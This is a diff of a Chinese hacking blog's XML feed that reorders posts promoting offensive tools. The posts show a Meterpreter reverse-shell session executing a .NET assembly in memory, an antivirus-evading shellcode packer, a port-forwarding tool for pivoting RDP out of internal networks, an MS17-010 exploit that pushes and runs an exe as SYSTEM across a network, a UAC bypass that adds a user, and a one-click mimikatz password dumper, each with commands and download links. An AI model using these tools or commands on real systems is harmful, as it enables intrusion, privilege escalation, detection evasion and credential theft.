@@ -1592,8 +1592,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
         <category>.NET</category>
         <category>内网</category>
         <category>源码</category>
-        <category>编程</category>
         <category>SQL</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -1623,47 +1623,6 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
         <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Metasploit/PowerShell内存加载执行.NET</title>
-    <url>/p/57438.html</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，<br>虽然.NET和PowerShell可以相互调用但PowerShell的兼容性远不如.NET，<br>且想要执行PowerShell，前提也需要.net环境，效率方面也是程序比脚本强<br>同样都可内存加载，为何非要鼓吹PowerShell呢，很多PowerShell框架或模块，<br>兼容性和稳定性并不好都没人说，好了不扯太远，下面我们来看一下如何使用<br>MSF中Meterpreter的powershell模块在内存中执行.NET程序集。</p>
-<h3 id="0x001-C-DLL"><a href="#0x001-C-DLL" class="headerlink" title="0x001 C# DLL"></a>0x001 C# DLL</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace msftest</span><br><span class="line">&#123;</span><br><span class="line">    public class msf</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run()</span><br><span class="line">        &#123;</span><br><span class="line">            return &quot;msftest by k8gege&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x002-PowerShell"><a href="#0x002-PowerShell" class="headerlink" title="0x002 PowerShell"></a>0x002 PowerShell</h3><p>首先我们先通过系统自带PowerShell执行DLL，看DLL功能是否正常。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">Reflection.Assembly</span>]::LoadFile(<span class="string">"C:\Users\k8gege\msftest.dll"</span>)</span><br><span class="line"></span><br><span class="line">GAC    Version        Location</span><br><span class="line">---    -------        --------</span><br><span class="line">False  v2.<span class="number">0.50727</span>     C:\Users\k8gege\\msftest.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">msftest.msf</span>]::run()</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x003-MSF加载-NET"><a href="#0x003-MSF加载-NET" class="headerlink" title="0x003 MSF加载.NET"></a>0x003 MSF加载.NET</h3><p>将DLL复制至MSF服务器,使用Meterpreter的powershell模块在内存中执行DLL</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.61:443 -&gt; 192.168.1.5:54647) at 2019-12-19 20:36:14 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; load powershell</span><br><span class="line">Loading extension powershell...Success.</span><br><span class="line">meterpreter &gt; powershell_import msftest.dll</span><br><span class="line">[+] File successfully imported. No result was returned.</span><br><span class="line">meterpreter &gt; powershell_execute <span class="string">"[msftest.msf]::run()"</span></span><br><span class="line">[+] Command execution completed:</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x004-关于兼容性"><a href="#0x004-关于兼容性" class="headerlink" title="0x004 关于兼容性"></a>0x004 关于兼容性</h3><p>1.MSF中的powershell模块稳定性和兼容性并不好，K8在两台WIN7中测试<br>有一台刚加载powershell模块，MET就崩溃导致权限丢失（而且还弹框）<br>再者某些程序集和PowerShell脚本也不能正常加载，有些功能也会失效。<br>这一点Cobalt Strike做得比较好，对.net和PowerShell兼容性80%吧，<br>.NET加载功能好比虚拟机加载操作系统，CS无法执行部分.NET函数很正常<br>正如Ladon在CS下执行，部分功能直接不可用，部分功能执行还有问题。<br>有些人可能说是Ladon的问题，当然说得也没错，但没想过CS的问题吗<br>它提供.NET程序执行的功能,只是使用了几个微软API接口，并不完全<br>试想一下被微软收购做了10几年.NET跨平台的MONO也不能保证100%兼容<br>CS确实是非常强大我承认(不然不使用)，但强大并不等于它就没有问题<br>它的缺点和优点一样，非常多，你用久了懂在理懂的功能多了就会发现<br>MONO那么大都不能保证完全兼容.NET，CS区区几行代码能完全兼容吗?</p>
-<p>我上面说的Ladon在CS下有问题，说Ladon也有问题没错，是因为我认为<br>写一个好的渗透工具，应尽量兼容各种环境。不过CS也只是使用的工具，<br>还不是目标环境，要是连工具自身有BUG的模块都能完全兼容，就是完美。</p>
-<p>目前Ladon有几个模块不兼容CS，在CNA脚本里有注明，用前必看。其它模块<br>可能在CS下使用远不如EXE好用，特别是那些没把时间改成3秒内的，默认60秒<br>才有回显，说成是Ladon扫描慢(即便改成0秒也慢)，因为CS无法完美快速回显。<br>看看CS自带的简单端口扫描或其它扫描，光扫几台机器，CS的回显就很慢吧。<br>何况Ladon还是外置插件，如Ladon扫描百度子域名很快，但在CS下回显很慢，<br>并不是Ladon扫得慢，好比把水管前面接一根吸管，要装满一桶水，能快吗。<br>Ladon扫描很快如同水管，但CS回显如同吸管，水管里的水再快也会因吸管变慢。</p>
-<p>2.powershell模块也支持EXE程序，但需要把.exe改成.dll后缀才能加载。<br>因为通过powershell加载，如果通过系统本身的PowerShell加载都不正常，<br>MSF加载也会失败，因为MSF并不是虚拟一个.NET加载功能。</p>
-<p>如下所示，有时通过系统PowerShell加载ex一样报错<br>PS C:\Users\k8gege&gt; [Reflection.Assembly]::LoadFile(“C:\Users\k8gege\test.exe”)<br>使用“1”个参数调用“LoadFile”时发生异常:“生成此程序集的运行时比当前加载的运<br>行时新,无法加载此程序集。 (异常来自 HRESULT:0x8013101B)”<br>所在位置 行:1 字符: 32</p>
-<ul>
-<li>[Reflection.Assembly]::LoadFile &lt;&lt;&lt;&lt; (“C:\Users\k8gege\test.exe”)<ul>
-<li>CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</li>
-<li>FullyQualifiedErrorId : DotNetMethodException</li>
-</ul>
-</li>
-</ul>
-<h3 id="0x005-结论"><a href="#0x005-结论" class="headerlink" title="0x005 结论"></a>0x005 结论</h3><p>虽然本文介绍了通过MSF加载执行.NET程序的方法，但是从兼容性以及稳定性来看<br>目前在实战中还是慎用为好，以免因为弹框或崩溃导致权限丢失。不能因为MSF强大<br>而无脑使用它的所有功能，程序强大并不代表所有功能模块都稳定好用。只需要使用<br>稳定好用的模块功能即可，其它模块可以等作者更新稳定后再使用。</p>
-<p>注意：我这里说的是不推荐用MSF中的PowerShell加载模块，并不是说MSF。<br>如同说霍金身体残废，但却没有说他是废人哦，何况只是说他一只手受伤。</p>
-]]></content>
-      <categories>
-        <category>Metasploit</category>
-        <category>.NET</category>
-        <category>PowerShell</category>
-      </categories>
-      <tags>
-        <tag>Metasploit</tag>
-        <tag>PowerShell</tag>
-        <tag>C#</tag>
-        <tag>.NET</tag>
-        <tag>MSF</tag>
-        <tag>meterpreter</tag>
       </tags>
   </entry>
   <entry>
@@ -1783,6 +1742,47 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
         <tag>HttpSniffer</tag>
         <tag>IIS</tag>
         <tag>LDAP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Metasploit/PowerShell内存加载执行.NET</title>
+    <url>/p/57438.html</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，<br>虽然.NET和PowerShell可以相互调用但PowerShell的兼容性远不如.NET，<br>且想要执行PowerShell，前提也需要.net环境，效率方面也是程序比脚本强<br>同样都可内存加载，为何非要鼓吹PowerShell呢，很多PowerShell框架或模块，<br>兼容性和稳定性并不好都没人说，好了不扯太远，下面我们来看一下如何使用<br>MSF中Meterpreter的powershell模块在内存中执行.NET程序集。</p>
+<h3 id="0x001-C-DLL"><a href="#0x001-C-DLL" class="headerlink" title="0x001 C# DLL"></a>0x001 C# DLL</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace msftest</span><br><span class="line">&#123;</span><br><span class="line">    public class msf</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run()</span><br><span class="line">        &#123;</span><br><span class="line">            return &quot;msftest by k8gege&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x002-PowerShell"><a href="#0x002-PowerShell" class="headerlink" title="0x002 PowerShell"></a>0x002 PowerShell</h3><p>首先我们先通过系统自带PowerShell执行DLL，看DLL功能是否正常。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">Reflection.Assembly</span>]::LoadFile(<span class="string">"C:\Users\k8gege\msftest.dll"</span>)</span><br><span class="line"></span><br><span class="line">GAC    Version        Location</span><br><span class="line">---    -------        --------</span><br><span class="line">False  v2.<span class="number">0.50727</span>     C:\Users\k8gege\\msftest.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">msftest.msf</span>]::run()</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x003-MSF加载-NET"><a href="#0x003-MSF加载-NET" class="headerlink" title="0x003 MSF加载.NET"></a>0x003 MSF加载.NET</h3><p>将DLL复制至MSF服务器,使用Meterpreter的powershell模块在内存中执行DLL</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.61:443 -&gt; 192.168.1.5:54647) at 2019-12-19 20:36:14 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; load powershell</span><br><span class="line">Loading extension powershell...Success.</span><br><span class="line">meterpreter &gt; powershell_import msftest.dll</span><br><span class="line">[+] File successfully imported. No result was returned.</span><br><span class="line">meterpreter &gt; powershell_execute <span class="string">"[msftest.msf]::run()"</span></span><br><span class="line">[+] Command execution completed:</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x004-关于兼容性"><a href="#0x004-关于兼容性" class="headerlink" title="0x004 关于兼容性"></a>0x004 关于兼容性</h3><p>1.MSF中的powershell模块稳定性和兼容性并不好，K8在两台WIN7中测试<br>有一台刚加载powershell模块，MET就崩溃导致权限丢失（而且还弹框）<br>再者某些程序集和PowerShell脚本也不能正常加载，有些功能也会失效。<br>这一点Cobalt Strike做得比较好，对.net和PowerShell兼容性80%吧，<br>.NET加载功能好比虚拟机加载操作系统，CS无法执行部分.NET函数很正常<br>正如Ladon在CS下执行，部分功能直接不可用，部分功能执行还有问题。<br>有些人可能说是Ladon的问题，当然说得也没错，但没想过CS的问题吗<br>它提供.NET程序执行的功能,只是使用了几个微软API接口，并不完全<br>试想一下被微软收购做了10几年.NET跨平台的MONO也不能保证100%兼容<br>CS确实是非常强大我承认(不然不使用)，但强大并不等于它就没有问题<br>它的缺点和优点一样，非常多，你用久了懂在理懂的功能多了就会发现<br>MONO那么大都不能保证完全兼容.NET，CS区区几行代码能完全兼容吗?</p>
+<p>我上面说的Ladon在CS下有问题，说Ladon也有问题没错，是因为我认为<br>写一个好的渗透工具，应尽量兼容各种环境。不过CS也只是使用的工具，<br>还不是目标环境，要是连工具自身有BUG的模块都能完全兼容，就是完美。</p>
+<p>目前Ladon有几个模块不兼容CS，在CNA脚本里有注明，用前必看。其它模块<br>可能在CS下使用远不如EXE好用，特别是那些没把时间改成3秒内的，默认60秒<br>才有回显，说成是Ladon扫描慢(即便改成0秒也慢)，因为CS无法完美快速回显。<br>看看CS自带的简单端口扫描或其它扫描，光扫几台机器，CS的回显就很慢吧。<br>何况Ladon还是外置插件，如Ladon扫描百度子域名很快，但在CS下回显很慢，<br>并不是Ladon扫得慢，好比把水管前面接一根吸管，要装满一桶水，能快吗。<br>Ladon扫描很快如同水管，但CS回显如同吸管，水管里的水再快也会因吸管变慢。</p>
+<p>2.powershell模块也支持EXE程序，但需要把.exe改成.dll后缀才能加载。<br>因为通过powershell加载，如果通过系统本身的PowerShell加载都不正常，<br>MSF加载也会失败，因为MSF并不是虚拟一个.NET加载功能。</p>
+<p>如下所示，有时通过系统PowerShell加载ex一样报错<br>PS C:\Users\k8gege&gt; [Reflection.Assembly]::LoadFile(“C:\Users\k8gege\test.exe”)<br>使用“1”个参数调用“LoadFile”时发生异常:“生成此程序集的运行时比当前加载的运<br>行时新,无法加载此程序集。 (异常来自 HRESULT:0x8013101B)”<br>所在位置 行:1 字符: 32</p>
+<ul>
+<li>[Reflection.Assembly]::LoadFile &lt;&lt;&lt;&lt; (“C:\Users\k8gege\test.exe”)<ul>
+<li>CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</li>
+<li>FullyQualifiedErrorId : DotNetMethodException</li>
+</ul>
+</li>
+</ul>
+<h3 id="0x005-结论"><a href="#0x005-结论" class="headerlink" title="0x005 结论"></a>0x005 结论</h3><p>虽然本文介绍了通过MSF加载执行.NET程序的方法，但是从兼容性以及稳定性来看<br>目前在实战中还是慎用为好，以免因为弹框或崩溃导致权限丢失。不能因为MSF强大<br>而无脑使用它的所有功能，程序强大并不代表所有功能模块都稳定好用。只需要使用<br>稳定好用的模块功能即可，其它模块可以等作者更新稳定后再使用。</p>
+<p>注意：我这里说的是不推荐用MSF中的PowerShell加载模块，并不是说MSF。<br>如同说霍金身体残废，但却没有说他是废人哦，何况只是说他一只手受伤。</p>
+]]></content>
+      <categories>
+        <category>Metasploit</category>
+        <category>.NET</category>
+        <category>PowerShell</category>
+      </categories>
+      <tags>
+        <tag>Metasploit</tag>
+        <tag>PowerShell</tag>
+        <tag>.NET</tag>
+        <tag>C#</tag>
+        <tag>MSF</tag>
+        <tag>meterpreter</tag>
       </tags>
   </entry>
   <entry>
@@ -2846,35 +2846,6 @@ Microsoft Windows 10 for 32-bit Systems 0
       </tags>
   </entry>
   <entry>
-    <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
-    <url>/p/9cffe32c.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
-<p>CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具</p>
-<p>加载器通过AES加密ShellCode，动态编译生成EXE。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/scencode.png"></p>
-<p>1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。</p>
-<p>可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。</p>
-<p>后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。</p>
-<p><strong>注意</strong>: <span style="color: #ff00ff;">一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀</span>(因为CS默认每分钟发送流量包,里面包含后门特征信息)</p>
-<p><strong>声明</strong>: 程序<span style="color: #ff00ff;">仅免杀shellcode</span>部分,CS加载的<span style="color: #ff00ff;">其它模块不免杀</span>(比如运行mimikaz读取密码被个别杀软查杀)</p>
-<p>CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll</p>
-<p>&nbsp;</p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x002 下载</strong> </span></p>
-<p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>免杀</category>
-        <category>Metasploit</category>
-        <category>Cobalt Strike</category>
-        <category>ShellCode</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-        <tag>Metasploit</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>K8 Struts2 EXP 综合漏洞利用工具</title>
     <url>/p/ab3e87f7.html</url>
     <content><![CDATA[<p>工具:&nbsp;K8&nbsp;Struts2&nbsp;Exploit<br>组织:&nbsp;K8搞基大队[K8team]<br>作者:&nbsp;K8拉登哥哥<br>博客:&nbsp;<a href="http://qqhack8.blog.163.com" target="_blank">http://qqhack8.blog.163.com</a><br>发布:&nbsp;2014/7/31&nbsp;10:24:56<br><br>简介: <br><br>K8 Struts2 综合漏洞利用工具 (Apache Struts Remote Code Execution Exploit)<br>Struts2漏洞检测工具&nbsp;&nbsp; Struts2漏洞测试工具&nbsp; K8 struts2 exploit Test&nbsp; Struts2 GetShell<br>支持漏洞 (S2-045 devMode S2-032&nbsp; s2-020&nbsp; s2-019&nbsp; s2-016&nbsp; s2-013&nbsp; s2-009 S2-005)&nbsp; <br><br>声明:工具仅供安全检测或网络攻防研究,非法用途后果自负.<br>图片: <br><img alt data-original="http://k8gege.org/k8img/posts/S2exp1.png"></p>
@@ -2919,6 +2890,35 @@ Microsoft Windows 10 for 32-bit Systems 0
         <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
+    <url>/p/9cffe32c.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
+<p>CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具</p>
+<p>加载器通过AES加密ShellCode，动态编译生成EXE。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/scencode.png"></p>
+<p>1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。</p>
+<p>可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。</p>
+<p>后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。</p>
+<p><strong>注意</strong>: <span style="color: #ff00ff;">一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀</span>(因为CS默认每分钟发送流量包,里面包含后门特征信息)</p>
+<p><strong>声明</strong>: 程序<span style="color: #ff00ff;">仅免杀shellcode</span>部分,CS加载的<span style="color: #ff00ff;">其它模块不免杀</span>(比如运行mimikaz读取密码被个别杀软查杀)</p>
+<p>CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll</p>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x002 下载</strong> </span></p>
+<p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>免杀</category>
+        <category>Metasploit</category>
+        <category>Cobalt Strike</category>
+        <category>ShellCode</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+        <tag>Metasploit</tag>
       </tags>
   </entry>
   <entry>
@@ -3014,6 +3014,76 @@ Microsoft Windows 10 for 32-bit Systems 0
         <tag>Tool</tag>
         <tag>Ladon</tag>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>.NET端口转发工具PortTran</title>
+    <url>/p/3f55538f.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 简介</strong></span></p>
+<p>PortTran by k8gege<br>.NET版端口转发工具，支持任意权限下转发 </p>
+<p><span style="font-size: 18px;"><strong>0x002 背景</strong></span><br>工具在2016年左右写的，当时某个内网不知何原故LCX用不了</p>
+<p>由于Win2003才刚停更不久，依然有不少内网还是03的机器</p>
+<p>加上.NET版的兼容性均没LCX好，所以我自己也很少用...</p>
+<p>以至于忘了自己有弄过这玩意，现在基本都WIN7以后系统</p>
+<p>.net程序不用慌了，体积小和易于免杀大家都开心了。</p>
+<p><span style="font-size: 18px;"><strong>0x003 用法</strong></span></p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">0x001 VPS监听
+PortTranS.exe 8000 338
+
+<p>0x002 目标内网转发<br>PortTranC20.exe 192.168.1.103 3389 192.168.1.102 8000</p>
+<p>0x003 VPS连接3389<br>mstsc /console /v:127.0.0.1:338<br></p></pre><p></p>
+</div>
+<p><span style="font-size: 18px;"><strong>&nbsp;0x004 实例 </strong></span></p>
+<p>1.vps监听</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran1.png"></p>
+<p>2.目标内网3389端口转发</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran2.png"></p>
+<p>3. 连接VPS的338端口即为被转发内网机器的3389，同理可转发其它端口，使用对应的工具连接就可以了</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran3.png"></p>
+<p>不要死板，很多人误以为只能用于转发3389，这是因为不理解什么叫端口转发，如果只能转特定端口</p>
+<p>就不会起名叫端口转发了，应该叫3389转发，1433、1521等端口不是端口吗？内网访问不了你都可以转出来</p>
+<p>再使用对应数据库连接工具连接啊，要懂得举一反三，不要死脑筋，只懂用于转发3389。</p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x005 下载</strong></span></p>
+<p><a href="https://github.com/k8gege/K8tools/raw/master/PortTran.rar" target="_blank">https://github.com/k8gege/PortTran</a></p>
+<p>&nbsp;</p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>.NET</category>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>C#</tag>
+        <tag>PortTran</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
+<p>&nbsp;</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>提权</category>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>SMB</tag>
+        <tag>MS17010</tag>
       </tags>
   </entry>
   <entry>
@@ -3131,73 +3201,49 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
       </tags>
   </entry>
   <entry>
-    <title>.NET端口转发工具PortTran</title>
-    <url>/p/3f55538f.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 简介</strong></span></p>
-<p>PortTran by k8gege<br>.NET版端口转发工具，支持任意权限下转发 </p>
-<p><span style="font-size: 18px;"><strong>0x002 背景</strong></span><br>工具在2016年左右写的，当时某个内网不知何原故LCX用不了</p>
-<p>由于Win2003才刚停更不久，依然有不少内网还是03的机器</p>
-<p>加上.NET版的兼容性均没LCX好，所以我自己也很少用...</p>
-<p>以至于忘了自己有弄过这玩意，现在基本都WIN7以后系统</p>
-<p>.net程序不用慌了，体积小和易于免杀大家都开心了。</p>
-<p><span style="font-size: 18px;"><strong>0x003 用法</strong></span></p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">0x001 VPS监听
-PortTranS.exe 8000 338
-
-<p>0x002 目标内网转发<br>PortTranC20.exe 192.168.1.103 3389 192.168.1.102 8000</p>
-<p>0x003 VPS连接3389<br>mstsc /console /v:127.0.0.1:338<br></p></pre><p></p>
-</div>
-<p><span style="font-size: 18px;"><strong>&nbsp;0x004 实例 </strong></span></p>
-<p>1.vps监听</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran1.png"></p>
-<p>2.目标内网3389端口转发</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran2.png"></p>
-<p>3. 连接VPS的338端口即为被转发内网机器的3389，同理可转发其它端口，使用对应的工具连接就可以了</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran3.png"></p>
-<p>不要死板，很多人误以为只能用于转发3389，这是因为不理解什么叫端口转发，如果只能转特定端口</p>
-<p>就不会起名叫端口转发了，应该叫3389转发，1433、1521等端口不是端口吗？内网访问不了你都可以转出来</p>
-<p>再使用对应数据库连接工具连接啊，要懂得举一反三，不要死脑筋，只懂用于转发3389。</p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x005 下载</strong></span></p>
-<p><a href="https://github.com/k8gege/K8tools/raw/master/PortTran.rar" target="_blank">https://github.com/k8gege/PortTran</a></p>
-<p>&nbsp;</p>]]></content>
+    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
+    <url>/p/41e1c61c.html</url>
+    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
+<p>工具: k8uac<br>编译: VC++</p>
+<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
+<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
+<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
+<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
+<p>示例如下:</p>
+<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
+<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
       <categories>
-        <category>工具</category>
-        <category>.NET</category>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>C#</tag>
-        <tag>PortTran</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
-<p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
         <category>提权</category>
-        <category>内网</category>
+        <category>工具</category>
       </categories>
       <tags>
         <tag>Exp</tag>
         <tag>Tool</tag>
-        <tag>SMB</tag>
-        <tag>MS17010</tag>
+        <tag>BypassUAC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mimikatz 2.1.1一键版 &amp; PowerShell</title>
+    <url>/p/77429fa6.html</url>
+    <content><![CDATA[<p>无需任何参数,运行EXE即可自动读取Windows系统密码</p>
+<p>EXE版需要其它功能请使用原版 (参数已写死仅读密码)</p>
+<p>结果保存于当前目录mz.log</p>
+<p>EXE</p>
